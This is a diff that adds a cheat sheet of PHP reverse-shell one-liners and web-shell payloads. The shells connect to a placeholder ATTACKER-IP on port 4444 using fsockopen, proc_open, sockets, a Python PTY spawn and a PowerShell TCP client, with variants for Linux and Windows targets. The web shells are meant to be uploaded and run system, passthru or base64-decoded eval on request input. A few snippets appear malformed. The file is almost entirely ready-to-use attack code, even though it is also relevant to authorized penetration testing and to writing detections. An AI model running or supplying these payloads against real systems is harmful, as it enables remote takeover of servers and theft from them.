@@ -1,0 +1,66 @@
+# ============================================================================
+# PHP REVERSE SHELLS - ONE-LINERS (2026)
+# Replace ATTACKER-IP and 4444 before use. Authorized targets only.
+# Test listener:  nc -lvnp 4444   |   socat TCP-LISTEN:4444,reuseaddr -
+# ============================================================================
+
+# ---------------------------------------------------------------------------
+# 1) CLASSIC fsockopen + exec  (works when shell_exec is allowed)
+# ---------------------------------------------------------------------------
+php -r '$sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Same, no file descriptors needed (uses proc_open - most reliable on CGI/FPM)
+php -r '$s=fsockopen("ATTACKER-IP",4444);$p=proc_open("/bin/sh",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$ps);while(!feof($s)&&!feof($ps[1])){stream_select($r=[$s,$ps[1],$ps[2]],$w=null,$e=null,null);if(in_array($s,$r))fwrite($ps[0],fread($s,1400));if(in_array($ps[1],$r))fwrite($s,fread($ps[1],1400));if(in_array($ps[2],$r))fwrite($s,fread($ps[2],1400));}'
+
+# ---------------------------------------------------------------------------
+# 2) fsockopen + popen (read-only-ish, pipe traffic)
+# ---------------------------------------------------------------------------
+php -r '$sock=fsockopen("ATTACKER-IP",4444);$p=popen("/bin/sh -i","r");while($line=fgets($p))fwrite($sock,$line);'
+# Interactive variant using proc_open + passthru loop (robust under php-fpm)
+
+# ---------------------------------------------------------------------------
+# 3) socket_create (works even when fsockopen is in disable_functions)
+# ---------------------------------------------------------------------------
+php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"ATTACKER-IP",4444);$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open("/bin/sh",$d,$ps);while(!feof($ps[1])){stream_select($r=array($s,$ps[1],$ps[2]),$w=null,$e=null,null);if(in_array($s,$r))fwrite($ps[0],socket_read($s,1400));if(in_array($ps[1],$r))socket_write($s,fread($ps[1],1400));if(in_array($ps[2],$r))socket_write($s,fread($ps[2],1400));}'
+
+# ---------------------------------------------------------------------------
+# 4) stream_socket_client (supports TLS upgrade - useful if you run an ssl listener)
+# ---------------------------------------------------------------------------
+php -r '$s=stream_socket_client("tcp://ATTACKER-IP:4444",$e,$es,30);stream_set_timeout($s,5);while($line=fgets(STDIN))fwrite($s,$line);'
+# Full: use stream_socket_client as the socket in variant 1's loop.
+
+# ---------------------------------------------------------------------------
+# 5) One-liner that upgrades to a PTY via python (nicer shell)
+# ---------------------------------------------------------------------------
+php -r '$s=fsockopen("ATTACKER-IP",4444);$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open("python3 -c \'import pty,socket,os;s=socket.socket();s.connect((\"ATTACKER-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")\'",$d,$ps);while(!feof($s)&&!feof($ps[1])){stream_select($r=array($s,$ps[1],$ps[2]),$w=null,$e=null,null);if(in_array($s,$r))fwrite($ps[0],fread($s,1400));if(in_array($ps[1],$r))fwrite($s,fread($ps[1],1400));if(in_array($ps[2],$r))fwrite($s,fread($ps[2],1400));}'
+
+# ---------------------------------------------------------------------------
+# 6) WEB-SHELL style (upload these - short tags work even with short_open_tag=Off)
+# ---------------------------------------------------------------------------
+<?= system($_GET[0]); ?>
+<?php system($_REQUEST[0]); ?>
+<?php $f="base64_decode";$f("JHNvY2s9...");eval(base64_decode($_POST[0])); ?>
+<%
+# If <? short tag is stripped, try:
+<?php echo passthru($_GET[0]); ?>
+<?php print shell_exec($_GET[0]); ?>
+<?xml php echo system($_GET[0]); ?>
+<!--<?php system($_GET[0]);?>-->
+
+# ---------------------------------------------------------------------------
+# 7) PHP multi-call variant when fgets/exec are both disabled (d output stream)
+# ---------------------------------------------------------------------------
+php -r '$s=fsockopen("ATTACKER-IP",4444);while(true){if(feof($s))break;$in=fread($s,1400);if(strlen($in)){$out=shell_exec($in);fwrite($s,$out);}}'
+
+# ---------------------------------------------------------------------------
+# 8) WINDOWS target (PHP on IIS / XAMPP)
+# ---------------------------------------------------------------------------
+php -r '$s=fsockopen("ATTACKER-IP",4444);exec("cmd /c <&3 >&3 2>&3");'
+php -r '$s=fsockopen("ATTACKER-IP",4444);$p=proc_open("cmd.exe",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$ps);while(!feof($s)&&!feof($ps[1])){stream_select($r=[$s,$ps[1],$ps[2]],$w=null,$e=null,null);if(in_array($s,$r))fwrite($ps[0],fread($s,1400));if(in_array($ps[1],$r))fwrite($s,fread($ps[1],1400));if(in_array($ps[2],$r))fwrite($s,fread($ps[2],1400));}'
+# PowerShell drop from PHP:
+php -r '$s=fsockopen("ATTACKER-IP",4444);$e="powershell -nop -c \"\$c=New-Object Net.Sockets.TCPClient(\'ATTACKER-IP\',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$x=(iex \$d 2>&1|Out-String);\$s.Write(([text.encoding]::ASCII).GetBytes(\$x),0,\$x.Length)};\$c.Close()\"";exec($e);'
+
+# ============================================================================
+# QUICK SMOKE TEST (run on attacker box) - confirm the target PHP version:
+#   php -r 'echo PHP_VERSION;'
+# ============================================================================
